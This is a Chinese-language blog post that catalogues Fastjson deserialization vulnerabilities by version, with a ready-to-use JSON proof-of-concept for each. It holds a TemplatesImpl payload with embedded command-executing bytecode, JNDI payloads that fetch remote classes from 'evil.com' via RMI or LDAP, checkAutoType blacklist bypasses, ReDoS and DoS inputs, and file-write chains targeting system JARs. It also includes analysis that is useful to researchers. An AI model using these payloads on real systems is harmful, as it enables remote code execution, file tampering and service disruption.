---
title: "Fastjson漏洞总结"
author: ["4shen0ne"]
lastmod: 2024-12-14T01:38:12+08:00
tags: ["poc", "fastjson"]
draft: false
---

## Fastjson 1.2.9 {#fastjson-1-dot-2-dot-9}

com/alibaba/fastjson/parser/ParserConfig.class 中其实增加了一个 denyList:

```text
this.denyList = new String[]{"java.lang.Thread"};
```

因此不能用 @type 反序列化 java.lang.Thread 类


## Fastjson 1.2.22 - 1.2.24 {#fastjson-1-dot-2-dot-22-1-dot-2-dot-24}

可利用链为 com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl, fastjson
在反序列化该类的过程中会调用 getOutputProperties 方法，并在 getTransletInstance
方法的执行过程中读取 \_bytecodes 属性中的字节码加载类，关键代码如下：

```java
if (_name == null) return null;

if (_class == null) defineTransletClasses();

// The translet needs to keep a reference to all its auxiliary
// class to prevent the GC from collecting them
AbstractTranslet translet = (AbstractTranslet) _class[_transletIndex].newInstance();
...
```

可见 poc 需要设置 \_name 属性，且恶意类要继承 AbstractTranslet 以便初始化，比如：

```java
public class EvilObject extends AbstractTranslet {
    public EvilObject() throws IOException {
        Runtime.getRuntime().exec("calc.exe");
    }

    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {}

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {}
}
```

poc:

```js
{"@type":"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl","_bytecodes":["yv66vgAAADEAJAoAAwAPBwARBwASAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAAtTdGF0aWNCbG9jawEADElubmVyQ2xhc3NlcwEAEUxFeHAkU3RhdGljQmxvY2s7AQAKU291cmNlRmlsZQEACEV4cC5qYXZhDAAEAAUHABMBAA9FeHAkU3RhdGljQmxvY2sBABBqYXZhL2xhbmcvT2JqZWN0AQADRXhwAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAcAFAoAFQAPAQAIPGNsaW5pdD4BABFqYXZhL2xhbmcvUnVudGltZQcAGAEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsMABoAGwoAGQAcAQAob3BlbiAvU3lzdGVtL0FwcGxpY2F0aW9ucy9DYWxjdWxhdG9yLmFwcAgAHgEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsMACAAIQoAGQAiACEAAgAVAAAAAAACAAEABAAFAAEABgAAAC8AAQABAAAABSq3ABaxAAAAAgAHAAAABgABAAAABwAIAAAADAABAAAABQAJAAwAAAAIABcABQABAAYAAAAWAAIAAAAAAAq4AB0SH7YAI1exAAAAAAACAA0AAAACAA4ACwAAAAoAAQACABAACgAJ"],"_name":"c","_tfactory":{},"outputProperties":{}}
```

在 1.2.25 版本中引入了 checkAutoType 安全机制，通过对 @type 中的类进行黑名单和白
名单检测来过略恶意类

commit: <https://github.com/alibaba/fastjson/commit/90af6aadfa9be7592fdc8e174458ddaebb2b19c4>


## Fastjson 1.2.41 {#fastjson-1-dot-2-dot-41}

出现对 1.2.25 版本 checkAutotype 机制的绕过：利用 [JNI]({{< relref "jni.md" >}}) 字段描述符绕过黑名单检查，
只需要在全限定类名前后分别加上 L 和 ;

poc:

```js
{"@type":"Lcom.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;","_bytecodes":["yv66vgAAADEAJAoAAwAPBwARBwASAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAAtTdGF0aWNCbG9jawEADElubmVyQ2xhc3NlcwEAEUxFeHAkU3RhdGljQmxvY2s7AQAKU291cmNlRmlsZQEACEV4cC5qYXZhDAAEAAUHABMBAA9FeHAkU3RhdGljQmxvY2sBABBqYXZhL2xhbmcvT2JqZWN0AQADRXhwAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAcAFAoAFQAPAQAIPGNsaW5pdD4BABFqYXZhL2xhbmcvUnVudGltZQcAGAEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsMABoAGwoAGQAcAQAob3BlbiAvU3lzdGVtL0FwcGxpY2F0aW9ucy9DYWxjdWxhdG9yLmFwcAgAHgEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsMACAAIQoAGQAiACEAAgAVAAAAAAACAAEABAAFAAEABgAAAC8AAQABAAAABSq3ABaxAAAAAgAHAAAABgABAAAABwAIAAAADAABAAAABQAJAAwAAAAIABcABQABAAYAAAAWAAIAAAAAAAq4AB0SH7YAI1exAAAAAAACAA0AAAACAA4ACwAAAAoAAQACABAACgAJ"],"_name":"c","_tfactory":{},"outputProperties":{}}
```


## Fastjson 1.2.42 {#fastjson-1-dot-2-dot-42}

黑名单进行了加密混淆：<https://github.com/LeadroyaL/fastjson-blacklist>

另外 checkAutotype 方法也对类名进行了额外检测，如果是 `Lcom.xxx;` 的形式会先删除首尾
字符再判断是否在黑名单中。但可以通过双写绕过：

```text
LLcom.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;;
```


## Fastjson 1.2.43 {#fastjson-1-dot-2-dot-43}

修复了 1.2.42 的双写绕过，但是可以用 `[` 绕过(在 JNI 字段描述符中表示数组层数)

```text
[com.sun.rowset.JdbcRowSetImpl
```

如果仅仅增加一个 `[`, fastjson 在解析时会报错，为了顺利反序列化还需要根据报错调整
poc，最终 poc 如下：

```js
{"@type":"[com.sun.rowset.JdbcRowSetImpl"[{,"dataSourceName":"ldap://localhost:1389/badNameClass", "autoCommit":true}
```

这个利用链属于 [JNDI]({{< relref "jndi.md" >}}) Bean Property, 在执行 setAutoCommit 方法时调用了
InitialContext#lookup 来加载远程类，相较于 TemplatesImpl, 不需要开启
SupportNonPublic

当然除了 json poc 还需要一个恶意 LDAPServer 和一个恶意类，可以使用 [mbechler/marshalsec](https://github.com/mbechler/marshalsec)


## Fastjson 1.2.45 {#fastjson-1-dot-2-dot-45}

漏洞产生原因很简单，就是利用了黑名单中没有的类——mybatis 库中的
JndiDataSourceFactory 类

poc:

```js
{"@type":"org.apache.ibatis.datasource.jndi.JndiDataSourceFactory","properties":{"data_source":"rmi://evil.com:3777/Exp"}}
```


## Fastjson 1.2.47 {#fastjson-1-dot-2-dot-47}

这版本漏洞的利用链依然是 com.sun.rowset.JdbcRowSetImpl, 但是 poc 的构造方法不同，
可以在不开启 AutoTypeSupport 的情况下使用并绕过 checkAutoType 的黑名单检查

poc:

```js
{"a":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"b":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://localhost:1389/ExecTest","autoCommit":true}}
```

可以看出这次的 poc 比之前多了一部分，这样构造的原因是 checkAutoType 在进行黑白名
单检查之前，会尝试从 mappings 变量中获取一些基础类，以便于在反序列化这些基础类时
提高效率

首先 fastjson 反序列化 poc 的 a 部分，checkAutoType 将返回 JdbcRowSetImpl 类的
class 对象。在后续调用 MiscCodec#deserialze 方法时，会尝试获取 json 中的 val 属
性，也就是 com.sun.rowset.JdbcRowSetImpl, 而如果反序列化的是 Class 对象，则调用
TypeUtils#loadClass 将 val 指示的类加入到 mappings 集合中

然后 fastjson 反序列化 poc 的 b 部分，按理来说 com.sun.rowset.JdbcRowSetImpl 会被
checkAutoType 的黑名单检测到，但因为这时候 JdbcRowSetImpl 类信息已经保存到
mappings 中了，checkAutoType 在进行黑名单检测前便从 mappings 中拿到类，从而跳过
了检测，顺利反序列化

详细分析：[Fastjson 1.2.47 漏洞分析](http://blog.topsec.com.cn/fastjson%e5%8e%86%e5%8f%b2%e6%bc%8f%e6%b4%9e%e7%a0%94%e7%a9%b6%ef%bc%88%e4%ba%8c%ef%bc%89/)


## Fastjson 1.2.59 {#fastjson-1-dot-2-dot-59}

fastjson 对转义字符 \x 的处理不当，导致 dos 漏洞

poc:

```js
{"c":"\x
```


## Fastjson 1.2.60 {#fastjson-1-dot-2-dot-60}

存在两个不在 checkAutoType 黑名单中的三方类可以被利用

1.  org.apache.commons.configuration.JNDIConfiguration

<!--listend-->

```js
{"@type":"org.apache.commons.configuration.JNDIConfiguration","prefix":"rmi://evil.com:3777/Exp"}
```

1.  oracle.jdbc.connector.OracleManagedConnectionFactory

<!--listend-->

```js
{"@type":"oracle.jdbc.connector.OracleManagedConnectionFactory","xaDataSourceName":"rmi://evil.com:3777/Exp"}
```

都是基于 JNDI 进行代码执行，需要恶意 RMIServer


## Fastjson 1.2.62 {#fastjson-1-dot-2-dot-62}

无条件的 re-dos 漏洞，即正则表达式导致的 dos 漏洞

poc1:

```js
{"regex":{"$ref":"$[poc rlike '^[a-zA-Z]+(([a-zA-Z ])?[a-zA-Z]*)*$']"}, "poc":"aaaaaaaaaaaaaaaaaaaaaaaaaaaa!"}
```

poc2:

```js
{"regex":{"$ref":"$[\poc = /\^[a-zA-Z]+(([a-zA-Z ])?[a-zA-Z]*)*$/]"}, "poc":"aaaaaaaaaaaaaaaaaaaaaaaaaaaa!"}
```


## Fastjson 1.2.68 {#fastjson-1-dot-2-dot-68}

这次漏洞围绕 checkAutoType 中的 expectClass 参数——当 expectClass 参数不为 Null、且当
前需要实例化的类型是 expectClass 的子类或实现时会将传入的类视为一个合法的类（此类
不能在黑名单中）

下面结合 checkAutoType 的部分代码来看一下在哪些情况下可以通过校验进行反序列化：

```java
  public Class<?> checkAutoType(String typeName, Class<?> expectClass, int features) {
      // ...
      // 对 expectClass 进行过滤
      final boolean expectClassFlag;
      if (expectClass == null) {
          expectClassFlag = false;
      } else {
          if (expectClass == Object.class
                  || expectClass == Serializable.class
                  || expectClass == Cloneable.class
                  || expectClass == Closeable.class
                  || expectClass == EventListener.class
                  || expectClass == Iterable.class
                  || expectClass == Collection.class
                  ) {
              expectClassFlag = false;
          } else {
              expectClassFlag = true;
          }
      }

      String className = typeName.replace('$', '.');
      Class<?> clazz;

      // ...
      // 如果设置了 autoType 或者 expectClass, 而当前类又不在白名单中，则进行黑名单校验
      if ((!internalWhite) && (autoTypeSupport || expectClassFlag)) {
          long hash = h3;
          for (int i = 3; i < className.length(); ++i) {
              hash ^= className.charAt(i);
              hash *= PRIME;
              if (Arrays.binarySearch(acceptHashCodes, hash) >= 0) {
                  clazz = TypeUtils.loadClass(typeName, defaultClassLoader, true);
                  if (clazz != null) {
                      return clazz;
                  }
              }
              if (Arrays.binarySearch(denyHashCodes, hash) >= 0 && TypeUtils.getClassFromMapping(typeName) == null) {
                  if (Arrays.binarySearch(acceptHashCodes, fullHash) >= 0) {
                      continue;
                  }

                  throw new JSONException("autoType is not support. " + typeName);
              }
          }
      }
      // 尝试从 mappings 中(包含一些基础类和缓存类)获取当前类
      clazz = TypeUtils.getClassFromMapping(typeName);
      // 符合反序列化器的类
      if (clazz == null) {
          clazz = deserializers.findClass(typeName);
      }
      // ParserConfig 中本身带有的集合
      if (clazz == null) {
          clazz = typeMapping.get(typeName);
      }
      // 白名单
      if (internalWhite) {
          clazz = TypeUtils.loadClass(typeName, defaultClassLoader, true);
      }

      if (clazz != null) {
          if (expectClass != null
                  && clazz != java.util.HashMap.class
                  && !expectClass.isAssignableFrom(clazz)) {
              throw new JSONException("type not match. " + typeName + " -> " + expectClass.getName());
          }
          // 直接返回，不用检查 autoTypeSupport 和黑名单
          return clazz;
      }
      // 没有开启 autoTypeSupport, 进行黑名单检查
      if (!autoTypeSupport) {
          long hash = h3;
          for (int i = 3; i < className.length(); ++i) {
              // ...
              if (Arrays.binarySearch(denyHashCodes, hash) >= 0) {
                  throw new JSONException("autoType is not support. " + typeName);
              }

              // white list
              if (Arrays.binarySearch(acceptHashCodes, hash) >= 0) {
                  clazz = TypeUtils.loadClass(typeName, defaultClassLoader, true);
                  if (clazz == null) {
                      return expectClass;
                  }
                  if (expectClass != null && expectClass.isAssignableFrom(clazz)) {
                      throw new JSONException("type not match. " + typeName + " -> " + expectClass.getName());
                  }
                  return clazz;
              }
          }
      }

      // ...
      if (autoTypeSupport || jsonType || expectClassFlag) {
          boolean cacheClass = autoTypeSupport || jsonType;
          clazz = TypeUtils.loadClass(typeName, defaultClassLoader, cacheClass);
      }

      if (clazz != null) {
          // ...
          // 检查当前类有没有继承或实现 expectClass
          if (expectClass != null) {
              if (expectClass.isAssignableFrom(clazz)) {
                  TypeUtils.addMapping(typeName, clazz);
                  return clazz;
              } else {
                  throw new JSONException("type not match. " + typeName + " -> " + expectClass.getName());
              }
          }
          // ...
      }

      if (!autoTypeSupport) {
          throw new JSONException("autoType is not support. " + typeName);
      }

      if (clazz != null) {
          TypeUtils.addMapping(typeName, clazz);
      }

      return clazz;
  }
```

总结一下，在以下情况可以通过 checkAutoType 的校验：

1.  白名单的类
2.  开启了 autoType 且类不在黑名单中
3.  使用了 JSONType 注解
4.  设置了 expectClass, 当前类是它的子类
5.  mappings 中的类，通常是一些预设的基础类和缓存的类

在上述限制中，有不少第三方库给挖掘出可以利用的链，我们分析一下
sun.rmi.server.MarshalOutputStream 这个利用链，通过它可以进行任意文件写入

poc:

```js
{"x":{"@type":"java.lang.AutoCloseable","@type":"sun.rmi.server.MarshalOutputStream","out":{"@type":"java.util.zip.InflaterOutputStream","out":{"@type":"java.io.FileOutputStream","file":"/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.282.b08-1.el7_9.x86_64/jre/lib/charsets.jar","append":false},"infl":{"input":"xxx"},"bufLen":1048576},"protocolVersion":1}}
```

首先检查 AutoCloseable 类，由于该类在 mappings 集合中，通过 getClassFromMapping
即可获取

{{< figure src="/ox-hugo/2021-11-25_21-05-25_screenshot.png" >}}

AutoCloseable 是接口类，fastjson 继续读取并检查后续的
sun.rmi.server.MarshalOutputStream, 并把 AutoCloseable 作为 expectClass 传入

通过黑白名单等一系列检查后来到下面的判断，此时 expectClassFlag 为 true, 加载了
MarshalOutputStream 类

{{< figure src="/ox-hugo/2021-11-25_21-10-44_screenshot.png" >}}

此时 clazz 不为空，且 MarshalOutputStream 继承了 AutoCloseable 接口，在下图的红
框中返回，避免了后续检查 autoTypeSupport 属性，因此在关闭 autoType 的情况下仍然
可以利用

{{< figure src="/ox-hugo/2021-11-25_21-15-13_screenshot.png" >}}

后续就不深入分析 MarshalOutputStream 这条链的反序列化过程了，除了这个 poc 还有其
他利用第三方库构造的 poc, 大致上都是利用了 AutoCloseable 这个在 mappings 中的类，
再结合 expectClass 属性从它的子类中去挖掘利用链

任意写文件：

```js
{"stream": {"@type": "java.lang.AutoCloseable", "@type": "org.eclipse.core.internal.localstore.SafeFileOutputStream", "targetPath": "f:/test/pwn.txt", "tempPath": "f:/test/test.txt"}, "writer": {"@type": "java.lang.AutoCloseable", "@type": "com.esotericsoftware.kryo.io.Output", "buffer": "YjF1M3I=", "outputStream": {"$ref": "$.stream"}, "position": 5}, "close": {"@type": "java.lang.AutoCloseable", "@type": "com.sleepycat.bind.serial.SerialOutput", "out": {"$ref": "$.writer"}}}
```

commons-io 2.0-2.6:

```js
{"x":{"@type":"com.alibaba.fastjson.JSONObject", "input":{"@type":"java.lang.AutoCloseable", "@type":"org.apache.commons.io.input.ReaderInputStream", "reader":{"@type":"org.apache.commons.io.input.CharSequenceReader", "charSequence":{"@type":"java.lang.String""aaaaaa...(长度要大于 8192，实际写入前 8192 个字符)"}, "charsetName":"UTF-8", "bufferSize":1024}, "branch":{"@type":"java.lang.AutoCloseable", "@type":"org.apache.commons.io.output.WriterOutputStream", "writer":{"@type":"org.apache.commons.io.output.FileWriterWithEncoding", "file":"/tmp/pwned", "encoding":"UTF-8", "append": false}, "charsetName":"UTF-8", "bufferSize": 1024, "writeImmediately": true}, "trigger":{"@type":"java.lang.AutoCloseable", "@type":"org.apache.commons.io.input.XmlStreamReader", "is":{"@type":"org.apache.commons.io.input.TeeInputStream", "input":{"$ref":"$.input"}, "branch":{"$ref":"$.branch"}, "closeBranch": true}, "httpContentType":"text/xml", "lenient":false, "defaultEncoding":"UTF-8"}, "trigger2":{"@type":"java.lang.AutoCloseable", "@type":"org.apache.commons.io.input.XmlStreamReader", "is":{"@type":"org.apache.commons.io.input.TeeInputStream", "input":{"$ref":"$.input"}, "branch":{"$ref":"$.branch"}, "closeBranch": true}, "httpContentType":"text/xml", "lenient":false, "defaultEncoding":"UTF-8"}, "trigger3":{"@type":"java.lang.AutoCloseable", "@type":"org.apache.commons.io.input.XmlStreamReader", "is":{"@type":"org.apache.commons.io.input.TeeInputStream", "input":{"$ref":"$.input"}, "branch":{"$ref":"$.branch"}, "closeBranch": true}, "httpContentType":"text/xml", "lenient":false, "defaultEncoding":"UTF-8"}}}
```

commons-io 2.7-2.8:

```js
{"x":{"@type":"com.alibaba.fastjson.JSONObject", "input":{"@type":"java.lang.AutoCloseable", "@type":"org.apache.commons.io.input.ReaderInputStream", "reader":{"@type":"org.apache.commons.io.input.CharSequenceReader", "charSequence":{"@type":"java.lang.String""aaaaaa...(长度要大于 8192，实际写入前 8192 个字符)", "start":0, "end":2147483647}, "charsetName":"UTF-8", "bufferSize":1024}, "branch":{"@type":"java.lang.AutoCloseable", "@type":"org.apache.commons.io.output.WriterOutputStream", "writer":{"@type":"org.apache.commons.io.output.FileWriterWithEncoding", "file":"/tmp/pwned", "charsetName":"UTF-8", "append": false}, "charsetName":"UTF-8", "bufferSize": 1024, "writeImmediately": true}, "trigger":{"@type":"java.lang.AutoCloseable", "@type":"org.apache.commons.io.input.XmlStreamReader", "inputStream":{"@type":"org.apache.commons.io.input.TeeInputStream", "input":{"$ref":"$.input"}, "branch":{"$ref":"$.branch"}, "closeBranch": true}, "httpContentType":"text/xml", "lenient":false, "defaultEncoding":"UTF-8"}, "trigger2":{"@type":"java.lang.AutoCloseable", "@type":"org.apache.commons.io.input.XmlStreamReader", "inputStream":{"@type":"org.apache.commons.io.input.TeeInputStream", "input":{"$ref":"$.input"}, "branch":{"$ref":"$.branch"}, "closeBranch": true}, "httpContentType":"text/xml", "lenient":false, "defaultEncoding":"UTF-8"}, "trigger3":{"@type":"java.lang.AutoCloseable", "@type":"org.apache.commons.io.input.XmlStreamReader", "inputStream":{"@type":"org.apache.commons.io.input.TeeInputStream", "input":{"$ref":"$.input"}, "branch":{"$ref":"$.branch"}, "closeBranch": true}, "httpContentType":"text/xml", "lenient":false, "defaultEncoding":"UTF-8"}}}
```
